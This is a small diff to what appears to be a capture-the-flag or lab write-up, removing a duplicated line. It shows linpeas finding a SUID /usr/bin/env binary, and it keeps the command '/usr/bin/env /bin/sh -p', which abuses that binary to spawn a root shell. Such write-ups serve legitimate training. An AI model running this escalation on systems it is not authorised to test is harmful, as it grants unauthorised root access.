@@ -68,8 +68,6 @@ After enumerating linpeas found a [SUID in /usr/bin/env](https://gtfobins.github
 
 `-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env`
 
-`/usr/bin/env /bin/sh -p`
-
 ```console
 /usr/bin/env /bin/sh -p
 # id
